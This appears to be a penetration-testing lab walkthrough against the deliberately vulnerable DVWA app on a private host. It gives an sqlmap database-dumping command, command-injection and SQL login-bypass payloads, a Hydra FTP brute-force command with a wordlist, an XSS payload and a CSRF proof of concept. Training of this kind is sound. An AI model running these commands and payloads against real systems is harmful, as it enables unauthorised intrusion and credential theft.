# 💥 Attack Walkthrough

## 1. SQL Injection
- Tool: SQLmap
- URL: `/dvwa/vulnerabilities/sqli/`
- Command:
```bash
sqlmap -u "http://192.168.146.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=..." --batch --dbs
```
Result: Extracted database names and tables

## 2. Command Injection
Location: /dvwa/vulnerabilities/exec/

Payloads:
```bash
127.0.0.1; id
8.8.8.8 && uname -a
```
Result: Command output visible in response

## 3. Auth Bypass
Location: DVWA Login page

Payload:
```bash
Username: ' or 1=1 --
Password: anything
```
Result: Successful login

## 4. FTP Brute Force
Tool: Hydra

Command:
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.146.129 -t 4
```

## 5. XSS (Reflected + Stored)
Location: /dvwa/vulnerabilities/xss_r/ and /xss_s/

Payload: <script>alert('xss')</script>

Result: Alert popups captured

## 6. CSRF (Medium Security)
Intercepted request showed no CSRF token

PoC created in csrf_attack.html using GET method

Password changed without server-side validation